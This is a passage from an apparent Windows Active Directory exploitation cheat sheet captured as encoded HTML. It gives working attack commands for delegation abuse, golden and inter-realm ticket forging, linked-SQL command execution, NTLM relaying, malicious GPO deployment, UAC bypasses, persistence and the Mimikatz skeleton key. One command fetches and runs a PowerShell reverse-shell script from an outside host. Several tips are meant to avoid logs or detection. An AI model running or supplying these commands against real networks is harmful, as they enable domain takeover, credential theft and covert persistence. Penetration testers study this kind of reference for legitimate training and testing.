=3D"token function">ConvertTo-SecureString</span> <span class=3D"token stri=
ng">'P4ssword123!'</span> <span class=3D"token operator">-</span>AsPlainTex=
t <span class=3D"token operator">-</span>Force<span class=3D"token punctuat=
ion">)</span>

<span class=3D"token comment"># Get SID of our machine account and bake raw=
 security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property =
on target</span>
<span class=3D"token variable">$sid</span> =3D <span class=3D"token functio=
n">Get-DomainComputer</span> <span class=3D"token operator">-</span>Identit=
y NewMachine <span class=3D"token operator">-</span>Properties objectsid <s=
pan class=3D"token punctuation">|</span> <span class=3D"token function">Sel=
ect</span> <span class=3D"token operator">-</span>Expand objectsid
<span class=3D"token variable">$SD</span> =3D <span class=3D"token function=
">New-Object</span> Security<span class=3D"token punctuation">.</span>Acces=
sControl<span class=3D"token punctuation">.</span>RawSecurityDescriptor <sp=
an class=3D"token operator">-</span>ArgumentList <span class=3D"token strin=
g">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<span class=3D"token function">$=
<span class=3D"token punctuation">(</span><span class=3D"token variable">$s=
id</span><span class=3D"token punctuation">)</span></span>)"</span>
<span class=3D"token variable">$SDbytes</span> =3D <span class=3D"token fun=
ction">New-Object</span> byte<span class=3D"token punctuation">[</span><spa=
n class=3D"token punctuation">]</span> <span class=3D"token punctuation">(<=
/span><span class=3D"token variable">$SD</span><span class=3D"token punctua=
tion">.</span>BinaryLength<span class=3D"token punctuation">)</span>
<span class=3D"token variable">$SD</span><span class=3D"token punctuation">=
.</span>GetBinaryForm<span class=3D"token punctuation">(</span><span class=
=3D"token variable">$SDbytes</span><span class=3D"token punctuation">,</spa=
n>0<span class=3D"token punctuation">)</span>

<span class=3D"token comment"># Use PowerView to use our GenericWrite (or s=
imilar) priv to apply this SD to the target</span>
<span class=3D"token function">Get-DomainComputer</span> <span class=3D"tok=
en operator">-</span>Identity TargetSrv <span class=3D"token punctuation">|=
</span> <span class=3D"token function">Set-DomainObject</span> <span class=
=3D"token operator">-</span><span class=3D"token function">Set</span> @<spa=
n class=3D"token punctuation">{</span><span class=3D"token string">'msds-al=
lowedtoactonbehalfofotheridentity'</span>=3D<span class=3D"token variable">=
$SDBytes</span><span class=3D"token punctuation">}</span>

<span class=3D"token comment"># Finally, use Rubeus to exploit RBCD to get =
a TGS as admin on the target</span>
<span class=3D"token punctuation">.</span>\Rubeus<span class=3D"token punct=
uation">.</span>exe s4u <span class=3D"token operator">/</span>user:NewMach=
ine$ <span class=3D"token operator">/</span>rc4:A9A70FD4DF48FBFAB37E257CFA9=
53312 <span class=3D"token operator">/</span>impersonateuser:Administrator =
<span class=3D"token operator">/</span>msdsspn:CIFS<span class=3D"token ope=
rator">/</span>TargetSrv<span class=3D"token punctuation">.</span>targetdom=
ain<span class=3D"token punctuation">.</span>com <span class=3D"token opera=
tor">/</span>ptt
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"abusing-domain-trust">Abusing=
 domain trust</h3><p>All commands must be run with DA privileges in the cur=
rent domain.</p><p>Note that if you completely compromise a child domain (<=
code>currentdomain.targetdomain.com</code>), you can <em>by definition</em>=
 also compromise the parent domain (<code>targetdomain.com</code>) due to t=
he implicit trust relationship. The same counts for any trust relationship =
where SID filtering is disabled (see <a href=3D"https://casvancooten.com/po=
sts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-r=
eference/#abusing-inter-forest-trust">=E2=80=98Abusing inter-forest trust=
=E2=80=99</a> below).</p><h4 id=3D"using-domain-trust-key">Using domain tru=
st key</h4><p>From the DC, dump the hash of the <code>currentdomain\targetd=
omain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). T=
hen, using this trust key and the domain SIDs, forge an inter-realm TGT usi=
ng Mimikatz, adding the SID for the target domain=E2=80=99s enterprise admi=
ns group to our =E2=80=98SID history=E2=80=99.</p><div class=3D"highlight">=
<div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;back=
ground-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" la=
nguage-plaintext"><code class=3D" language-plaintext" data-lang=3D"plaintex=
t">kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-18=
74506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426=
-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krb=
tgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><p>Pass this ticket with Rubeus.</p><div=
 class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-powershell"><code class=3D" language-powershel=
l" data-lang=3D"powershell"><span class=3D"token punctuation">.</span>\Rube=
us<span class=3D"token punctuation">.</span>exe asktgs <span class=3D"token=
 operator">/</span>ticket:c:\users\public\ticket<span class=3D"token punctu=
ation">.</span>kirbi <span class=3D"token operator">/</span>service:LDAP<sp=
an class=3D"token operator">/</span>dc<span class=3D"token punctuation">.</=
span>targetdomain<span class=3D"token punctuation">.</span>com <span class=
=3D"token operator">/</span>dc:dc<span class=3D"token punctuation">.</span>=
targetdomain<span class=3D"token punctuation">.</span>com <span class=3D"to=
ken operator">/</span>ptt
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>We can now DCSync the target domain =
(see below).</p><h4 id=3D"using-krbtgt-hash">Using krbtgt hash</h4><p>From =
the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this=
 hash, forge an inter-realm TGT using Mimikatz, as with the previous method=
.</p><p>Doing this requires the SID of the current domain as the <code>/sid=
</code> parameter, and the SID of the target domain as part of the <code>/s=
ids</code> parameter. You can grab these using PowerView=E2=80=99s <code>Ge=
t-DomainSID</code>. Use a SID History (<code>/sids</code>) of <code>*-516</=
code> and <code>S-1-5-9</code> to disguise as the Domain Controllers group =
and Enterprise Domain Controllers respectively, to be less noisy in the log=
s.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D=
"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-=
size:4;tab-size:4" class=3D" language-plaintext"><code class=3D" language-p=
laintext" data-lang=3D"plaintext">kerberos::golden /domain:currentdomain.ta=
rgetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21=
-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603d=
a26796f35 /user:DC$ /groups:516 /ptt
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><blockquote><p>If you are having issues =
creating this ticket, try adding the =E2=80=99target=E2=80=99 flag, e.g. <c=
ode>/target:targetdomain.com</code>.</p></blockquote><p>Alternatively, gene=
rate a domain admin ticket with SID history of enterprise administrators gr=
oup in the target domain.</p><pre tabindex=3D"0"><code>kerberos::golden /us=
er:Administrator /domain:currentdomain.targetdomain.com /sid:S-1-5-21-18745=
06631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S=
-1-5-21-280534878-1496970234-700767426-519 /ptt
</code></pre><p>We can now immediately DCSync the target domain, or get a r=
everse shell using e.g. scheduled tasks.</p><h3 id=3D"abusing-inter-forest-=
trust">Abusing inter-forest trust</h3><p>Since a forest is a security bound=
ary, we can only access domain services that have been shared with the doma=
in we have compromised (our source domain). Use e.g. BloodHound to look for=
 users that have an account (with the same username) in both forests and tr=
y password re-use. Additionally, we can use BloodHound or PowerView to hunt=
 for foreign group memberships between forests. The PowerView command:</p><=
div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" sty=
le=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;=
tab-size:4" class=3D" language-powershell"><code class=3D" language-powersh=
ell" data-lang=3D"powershell"><span class=3D"token function">Get-DomainFore=
ignGroupMember</span> <span class=3D"token operator">-</span>domain targetd=
omain<span class=3D"token punctuation">.</span>com
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>In some cases, it is possible that S=
ID filtering (the protection causing the above), is <em>disabled</em> betwe=
en forests. If you run <code>Get-DomainTrust</code> and you see the <code>T=
REAT_AS_EXTERNAL</code> property, this is the case! In this case, you can a=
buse the forest trust like a domain trust, as described above. Note that yo=
u still can <em>NOT</em> forge a ticket for any SID between 500 and 1000 th=
ough, so you can=E2=80=99t become DA (not even indirectly through group inh=
eritance). In this case, look for groups that grant e.g. local admin on the=
 domain controller or similar non-domain privileges. For more information, =
refer to <a href=3D"https://dirkjanm.io/active-directory-forest-trusts-part=
-one-how-does-sid-filtering-work/">this blog post</a>.</p><p>To impersonate=
 a user from our source domain to access services in a foreign domain, we c=
an do the following. Extract inter-forest trust key as in <a href=3D"https:=
//casvancooten.com/posts/2020/11/windows-active-directory-exploitation-chea=
t-sheet-and-command-reference/#using-domain-trust-key">=E2=80=98Using domai=
n trust key=E2=80=99</a> above.</p><p>Use Mimikatz to generate a TGT for th=
e target domain using the trust key:</p><div class=3D"highlight"><div class=
=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-col=
or:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-pla=
intext"><code class=3D" language-plaintext" data-lang=3D"plaintext">Kerbero=
s::golden /user:Administrator /service:krbtgt /domain:currentdomain.com /si=
d:S-1-5-21-1874506631-3219952063-538504511 /target:targetdomain.com /rc4:fe=
8884bf222153ca57468996c9b348e9 /ticket:ticket.kirbi
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><p>Then, use Rubeus to ask a TGS for e.g=
. the <code>CIFS</code> service on the target DC using this TGT.</p><div cl=
ass=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"=
color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-si=
ze:4" class=3D" language-powershell"><code class=3D" language-powershell" d=
ata-lang=3D"powershell"><span class=3D"token punctuation">.</span>\Rubeus<s=
pan class=3D"token punctuation">.</span>exe asktgs <span class=3D"token ope=
rator">/</span>ticket:c:\ad\tools\eucorp<span class=3D"token operator">-</s=
pan>tgt<span class=3D"token punctuation">.</span>kirbi <span class=3D"token=
 operator">/</span>service:CIFS<span class=3D"token operator">/</span>euroc=
orp<span class=3D"token operator">-</span>dc<span class=3D"token punctuatio=
n">.</span>eurocorp<span class=3D"token punctuation">.</span>local <span cl=
ass=3D"token operator">/</span>dc:eurocorp<span class=3D"token operator">-<=
/span>dc<span class=3D"token punctuation">.</span>eurocorp<span class=3D"to=
ken punctuation">.</span>local <span class=3D"token operator">/</span>ptt
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>Now we can use the CIFS service on t=
he target forest=E2=80=99s DC as the DA of our source domain (again, as lon=
g as this trust was configured to exist).</p><h3 id=3D"abusing-mssql-databa=
ses-for-lateral-movement">Abusing MSSQL databases for lateral movement</h3>=
<p>MSSQL databases can be linked, such that if you compromise one you can e=
xecute queries (or even OS commands!) on other databases in the context of =
a specific user (<code>sa</code> maybe? =F0=9F=98=99). If this is configure=
d, it can even be used to traverse Forest boundaries! If we have SQL execut=
ion, we can use the following commands to enumerate database links.</p><div=
 class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=
=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;ta=
b-size:4" class=3D" language-sql"><code class=3D" language-sql" data-lang=
=3D"sql"><span class=3D"token comment">-- Find linked servers</span>
<span class=3D"token keyword">EXEC</span> sp_linkedservers

<span class=3D"token comment">-- Run SQL query on linked server</span>
<span class=3D"token keyword">select</span> mylogin <span class=3D"token ke=
yword">from</span> <span class=3D"token keyword">openquery</span><span clas=
s=3D"token punctuation">(</span><span class=3D"token string">"TARGETSERVER"=
</span><span class=3D"token punctuation">,</span> <span class=3D"token stri=
ng">'select SYSTEM_USER as mylogin'</span><span class=3D"token punctuation"=
>)</span>

<span class=3D"token comment">-- Enable 'xp_cmdshell' on remote server and =
execute commands, only works if RPC is enabled</span>
<span class=3D"token keyword">EXEC</span> <span class=3D"token punctuation"=
>(</span><span class=3D"token string">'sp_configure ''show advanced options=
'', 1; reconfigure'</span><span class=3D"token punctuation">)</span> AT TAR=
GETSERVER
<span class=3D"token keyword">EXEC</span> <span class=3D"token punctuation"=
>(</span><span class=3D"token string">'sp_configure ''xp_cmdshell'', 1; rec=
onfigure'</span><span class=3D"token punctuation">)</span> AT TARGETSERVER
<span class=3D"token keyword">EXEC</span> <span class=3D"token punctuation"=
>(</span><span class=3D"token string">'xp_cmdshell ''whoami'' '</span><span=
 class=3D"token punctuation">)</span> AT TARGETSERVER
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>SQL</=
span></div></div></div></div><p>We can also use <a href=3D"https://github.c=
om/NetSPI/PowerUpSQL">PowerUpSQL</a> to look for databases within the domai=
n, and gather further information on (reachable) databases. We can also aut=
omatically look for, and execute queries or commands on, linked databases (=
even through multiple layers of database links).</p><div class=3D"highlight=
"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;ba=
ckground-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" =
language-powershell"><code class=3D" language-powershell" data-lang=3D"powe=
rshell"><span class=3D"token comment"># Get MSSQL databases in the domain, =
and test connectivity</span>
<span class=3D"token function">Get-SQLInstanceDomain</span> <span class=3D"=
token punctuation">|</span> <span class=3D"token function">Get-SQLConnectio=
nTestThreaded</span> <span class=3D"token punctuation">|</span> <span class=
=3D"token function">ft</span>

<span class=3D"token comment"># Try to get information on all domain databa=
ses</span>
<span class=3D"token function">Get-SQLInstanceDomain</span> <span class=3D"=
token punctuation">|</span> <span class=3D"token function">Get-SQLServerInf=
o</span>

<span class=3D"token comment"># Get information on a single reachable datab=
ase</span>
<span class=3D"token function">Get-SQLServerInfo</span> <span class=3D"toke=
n operator">-</span>Instance TARGETSERVER

<span class=3D"token comment"># Scan for MSSQL misconfigurations to escalat=
e to SA</span>
<span class=3D"token function">Invoke-SQLAudit</span> <span class=3D"token =
operator">-</span>Verbose <span class=3D"token operator">-</span>Instance T=
ARGETSERVER

<span class=3D"token comment"># Execute SQL query</span>
<span class=3D"token function">Get-SQLQuery</span> <span class=3D"token ope=
rator">-</span>Query <span class=3D"token string">"SELECT system_user"</spa=
n> <span class=3D"token operator">-</span>Instance TARGETSERVER

<span class=3D"token comment"># Run command (enables XP_CMDSHELL automatica=
lly if required)</span>
<span class=3D"token function">Invoke-SQLOSCmd</span> <span class=3D"token =
operator">-</span>Instance TARGETSERVER <span class=3D"token operator">-</s=
pan>Command <span class=3D"token string">"whoami"</span> <span class=3D"tok=
en punctuation">|</span>  <span class=3D"token function">select</span> <spa=
n class=3D"token operator">-</span>ExpandProperty CommandResults

<span class=3D"token comment"># Automatically find all linked databases</sp=
an>
<span class=3D"token function">Get-SqlServerLinkCrawl</span> <span class=3D=
"token operator">-</span>Instance TARGETSERVER <span class=3D"token punctua=
tion">|</span> <span class=3D"token function">select</span> instance<span c=
lass=3D"token punctuation">,</span>links <span class=3D"token punctuation">=
|</span> <span class=3D"token function">ft</span>

<span class=3D"token comment"># Run command if XP_CMDSHELL is enabled on an=
y of the linked databases</span>
<span class=3D"token function">Get-SqlServerLinkCrawl</span> <span class=3D=
"token operator">-</span>Instance TARGETSERVER <span class=3D"token operato=
r">-</span>Query <span class=3D"token string">'EXEC xp_cmdshell "whoami"'</=
span> <span class=3D"token punctuation">|</span> <span class=3D"token funct=
ion">select</span> instance<span class=3D"token punctuation">,</span>links<=
span class=3D"token punctuation">,</span>customquery <span class=3D"token p=
unctuation">|</span> <span class=3D"token function">ft</span>

<span class=3D"token function">Get-SqlServerLinkCrawl</span> <span class=3D=
"token operator">-</span>Instance TARGETSERVER <span class=3D"token operato=
r">-</span>Query <span class=3D"token string">'EXEC xp_cmdshell "powershell=
.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.5=
5/Invoke-PowerShellTcpRun.ps1'')"'</span> <span class=3D"token punctuation"=
>|</span> <span class=3D"token function">select</span> instance<span class=
=3D"token punctuation">,</span>links<span class=3D"token punctuation">,</sp=
an>customquery <span class=3D"token punctuation">|</span> <span class=3D"to=
ken function">ft</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>If you have low-privileged access to=
 a MSSQL database and no links are present, you could potentially force NTL=
M authentication by using the <code>xp_dirtree</code> stored procedure to a=
ccess this share. If this is successful, the NetNTLM for the SQL service ac=
count can be collected and potentially cracked or relayed to compromise mac=
hines as that service account.</p><div class=3D"highlight"><div class=3D"co=
de-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#20=
2020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-sql"><cod=
e class=3D" language-sql" data-lang=3D"sql"><span class=3D"token keyword">E=
XEC</span> master<span class=3D"token punctuation">.</span><span class=3D"t=
oken punctuation">.</span>xp_dirtree <span class=3D"token string">"\\192.16=
8.49.67\share"</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>SQL</=
span></div></div></div></div><p>Example command to relay the hash to authen=
ticate as local admin (if the service account has these privileges) and run=
 <code>calc.exe</code>. Omit the <code>-c</code> parameter to attempt a <co=
de>secretsdump</code> instead.</p><div class=3D"highlight"><div class=3D"co=
de-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#20=
2020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-bash"><co=
de class=3D" language-bash" data-lang=3D"bash"><span class=3D"token functio=
n">sudo</span> impacket-ntlmrelayx --no-http-server -smb2support -t <span c=
lass=3D"token number">192.168</span>.67.6 -c <span class=3D"token string">'=
calc.exe'</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><h3 id=3D"abusing-group-policy-objects-for-la=
teral-movement">Abusing Group Policy Objects for lateral movement</h3><p>If=
 we identify that we have the permissions to edit and link new Group Policy=
 Objects (GPOs) within the domain (refer to <a href=3D"https://casvancooten=
.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-co=
mmand-reference/#ad-enumeration-with-powerview">=E2=80=98AD Enumeration Wit=
h PowerView=E2=80=99</a>), we can abuse these privileges to move laterally =
towards other machines.</p><p>As an example, we can use the legitimate <a h=
ref=3D"https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-=
management-components/remote-server-administration-tools">Remote System Adm=
inistration Tools</a> (RSAT) for Windows to create a new GPO, link it to th=
e target, and deploy a registry runkey to add a command that will run autom=
atically the next time the machine boots.</p><div class=3D"highlight"><div =
class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;backgroun=
d-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" languag=
e-powershell"><code class=3D" language-powershell" data-lang=3D"powershell"=
><span class=3D"token comment"># Create a new GPO and link it to the target=
 server</span>
<span class=3D"token function">New-GPO</span> <span class=3D"token operator=
">-</span>Name <span class=3D"token string">'Totally Legit GPO'</span> <spa=
n class=3D"token punctuation">|</span> <span class=3D"token function">New-G=
PLink</span> <span class=3D"token operator">-</span>Target <span class=3D"t=
oken string">'OU=3DTargetComputer,OU=3DWorkstations,DC=3DTargetDomain,DC=3D=
com'</span>

<span class=3D"token comment"># Link an existing GPO to another target serv=
er</span>
<span class=3D"token function">New-GPLink</span> <span class=3D"token opera=
tor">-</span>Target <span class=3D"token string">'OU=3DTargetComputer2,OU=
=3DWorkstations,DC=3DTargetDomain,DC=3Dcom'</span> <span class=3D"token ope=
rator">-</span>Name <span class=3D"token string">'Totally Legit GPO'</span>

<span class=3D"token comment"># Deploy a registry runkey via the GPO</span>
<span class=3D"token function">Set-GPPrefRegistryValue</span> <span class=
=3D"token operator">-</span>Name <span class=3D"token string">'Totally Legi=
t GPO'</span> <span class=3D"token operator">-</span>Context Computer <span=
 class=3D"token operator">-</span>Action Create <span class=3D"token operat=
or">-</span>Key <span class=3D"token string">'HKLM\Software\Microsoft\Windo=
ws\CurrentVersion\Run'</span> <span class=3D"token operator">-</span>ValueN=
ame <span class=3D"token string">'Updater'</span> <span class=3D"token oper=
ator">-</span>Value <span class=3D"token string">'cmd.exe /c calc.exe'</spa=
n> <span class=3D"token operator">-</span><span class=3D"token function">Ty=
pe</span> ExpandString
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><p>We can also use <a href=3D"https://g=
ithub.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a> to deploy an immedia=
te scheduled task, which will run whenever the group policy is refreshed (e=
very 1-2 hours by default). SharpGPOABuse does not create its own GPO objec=
ts, so we first have to run the commands for creating and linking GPOs list=
ed above. After this, we can run SharpGPOAbuse to deploy the immediate task=
.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"=
0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-s=
ize:4;tab-size:4" class=3D" language-powershell"><code class=3D" language-p=
owershell" data-lang=3D"powershell">SharpGPOAbuse<span class=3D"token punct=
uation">.</span>exe <span class=3D"token operator">--</span>AddComputerTask=
 <span class=3D"token operator">--</span>TaskName <span class=3D"token stri=
ng">"Microsoft LEGITIMATE Hotfix"</span> <span class=3D"token operator">--<=
/span>Author NT AUTHORITY\SYSTEM <span class=3D"token operator">--</span>Co=
mmand <span class=3D"token string">"cmd.exe"</span> <span class=3D"token op=
erator">--</span>Arguments <span class=3D"token string">"/c start calc.exe"=
</span> <span class=3D"token operator">--</span>GPOName <span class=3D"toke=
n string">"Totally Legit GPO"</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h2 id=3D"privilege-escalation">Privile=
ge Escalation</h2><p>For more things to look for (both Windows and Linux), =
refer to my <a href=3D"https://cas.vancooten.com/posts/2020/05/oscp-cheat-s=
heet-and-command-reference/">OSCP cheat sheet and command reference</a>.</p=
><h3 id=3D"powerup">PowerUp</h3><div class=3D"highlight"><div class=3D"code=
-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#2020=
20;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powershell"=
><code class=3D" language-powershell" data-lang=3D"powershell"><span class=
=3D"token comment"># Check for vulnerable programs and configs</span>
<span class=3D"token function">Invoke-AllChecks</span>

<span class=3D"token comment"># Exploit vulnerable service permissions (doe=
s not require touching disk)</span>
<span class=3D"token function">Invoke-ServiceAbuse</span> <span class=3D"to=
ken operator">-</span>Name <span class=3D"token string">"VulnerableSvc"</sp=
an> <span class=3D"token operator">-</span>Command <span class=3D"token str=
ing">"net localgroup Administrators DOMAIN\user /add"</span>

<span class=3D"token comment"># Exploit an unquoted service path vulnerabil=
ity to spawn a beacon</span>
<span class=3D"token function">Write-ServiceBinary</span> <span class=3D"to=
ken operator">-</span>Name <span class=3D"token string">'VulnerableSvc'</sp=
an> <span class=3D"token operator">-</span>Command <span class=3D"token str=
ing">'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update'</span=
> <span class=3D"token operator">-</span>Path <span class=3D"token string">=
'C:\Program Files\VulnerableSvc'</span>

<span class=3D"token comment"># Restart the service to exploit (not always =
required)</span>
net<span class=3D"token punctuation">.</span>exe stop VulnerableSvc
net<span class=3D"token punctuation">.</span>exe <span class=3D"token funct=
ion">start</span> VulnerableSvc
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h3 id=3D"uac-bypass">UAC Bypass</h3><p=
>Using <a href=3D"https://github.com/FatRodzianko/SharpBypassUAC">SharpBypa=
ssUAC</a>.</p><div class=3D"highlight"><div class=3D"code-toolbar"><pre tab=
index=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-moz-tab-size:4=
;-o-tab-size:4;tab-size:4" class=3D" language-bash"><code class=3D" languag=
e-bash" data-lang=3D"bash"><span class=3D"token comment"># Generate Encoded=
Command</span>
<span class=3D"token builtin class-name">echo</span> -n <span class=3D"toke=
n string">'cmd /c start rundll32 c:<span class=3D"token entity" title=3D"\\=
">\\</span>users<span class=3D"token entity" title=3D"\\">\\</span>public<s=
pan class=3D"token entity" title=3D"\\">\\</span>beacon.dll,Update'</span> =
<span class=3D"token operator">|</span> base64

<span class=3D"token comment"># Use SharpBypassUAC e.g. from a CobaltStrike=
 beacon</span>
beacon<span class=3D"token operator">&gt;</span> execute-assembly /opt/Shar=
pBypassUAC/SharpBypassUAC.exe -b eventvwr -e <span class=3D"token assign-le=
ft variable">Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZG=
xsLFVwZGF0ZQ</span><span class=3D"token operator">=3D=3D</span>
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Bash<=
/span></div></div></div></div><p>In some cases, you may get away better wit=
h running a manual UAC bypass, such as the FODHelper bypass which is quite =
simple to execute in PowerShell.</p><div class=3D"highlight"><div class=3D"=
code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#=
202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-powersh=
ell"><code class=3D" language-powershell" data-lang=3D"powershell"><span cl=
ass=3D"token comment"># The command to execute in high integrity context</s=
pan>
<span class=3D"token variable">$cmd</span> =3D <span class=3D"token string"=
>"cmd /c start powershell.exe"</span>
=20
<span class=3D"token comment"># Set the registry values</span>
<span class=3D"token function">New-Item</span> <span class=3D"token string"=
>"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class=
=3D"token operator">-</span>Force
<span class=3D"token function">New-ItemProperty</span> <span class=3D"token=
 operator">-</span>Path <span class=3D"token string">"HKCU:\Software\Classe=
s\ms-settings\Shell\Open\command"</span> <span class=3D"token operator">-</=
span>Name <span class=3D"token string">"DelegateExecute"</span> <span class=
=3D"token operator">-</span>Value <span class=3D"token string">""</span> <s=
pan class=3D"token operator">-</span>Force
<span class=3D"token function">Set-ItemProperty</span> <span class=3D"token=
 operator">-</span>Path <span class=3D"token string">"HKCU:\Software\Classe=
s\ms-settings\Shell\Open\command"</span> <span class=3D"token operator">-</=
span>Name <span class=3D"token string">"(default)"</span> <span class=3D"to=
ken operator">-</span>Value <span class=3D"token variable">$cmd</span> <spa=
n class=3D"token operator">-</span>Force
=20
<span class=3D"token comment"># Trigger fodhelper to perform the bypass</sp=
an>
<span class=3D"token function">Start-Process</span> <span class=3D"token st=
ring">"C:\Windows\System32\fodhelper.exe"</span> <span class=3D"token opera=
tor">-</span>WindowStyle Hidden
=20
<span class=3D"token comment"># Clean registry</span>
<span class=3D"token function">Start-Sleep</span> 3
<span class=3D"token function">Remove-Item</span> <span class=3D"token stri=
ng">"HKCU:\Software\Classes\ms-settings\"</span> <span class=3D"token opera=
tor">-</span>Recurse <span class=3D"token operator">-</span>Force
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Power=
Shell</span></div></div></div></div><h2 id=3D"persistence">Persistence</h2>=
<h3 id=3D"startup-folder">Startup folder</h3><p>Just drop a binary. Classic=
. =F0=9F=98=8E=F0=9F=9A=A9</p><p>In current user folder, will trigger when =
current user signs in:</p><div class=3D"highlight"><div class=3D"code-toolb=
ar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;background-color:#202020;-mo=
z-tab-size:4;-o-tab-size:4;tab-size:4" class=3D" language-plaintext"><code =
class=3D" language-plaintext" data-lang=3D"plaintext">c:\Users\[USERNAME]\A=
ppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><p>Or in the global startup folder, requ=
ires administrative privileges but will trigger as SYSTEM on boot <em>and</=
em> in a user context whenever any user signs in:</p><div class=3D"highligh=
t"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"color:#d0d0d0;b=
ackground-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=3D"=
 language-plaintext"><code class=3D" language-plaintext" data-lang=3D"plain=
text">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><h2 id=3D"domain-persistence">Domain Per=
sistence</h2><p>Must be run with DA privileges.</p><h3 id=3D"mimikatz-skele=
ton-key-attack">Mimikatz skeleton key attack</h3><p>Run from DC. Enables pa=
ssword =E2=80=9Cmimikatz=E2=80=9D for all users. =F0=9F=9A=A9</p><div class=
=3D"highlight"><div class=3D"code-toolbar"><pre tabindex=3D"0" style=3D"col=
or:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:=
4" class=3D" language-plaintext"><code class=3D" language-plaintext" data-l=
ang=3D"plaintext">privilege::debug
misc::skeleton
</code></pre><div class=3D"toolbar"><div class=3D"toolbar-item"><span>Plain=
text</span></div></div></div></div><h3 id=3D"grant-specific-user-dcsync-rig=
hts-with-powerview">Grant specific user DCSync rights with PowerView</h3><p=
>Gives a user of your choosing the rights to DCSync at any time. May evade =
detection in some setups.</p><div class=3D"highlight"><div class=3D"code-to=
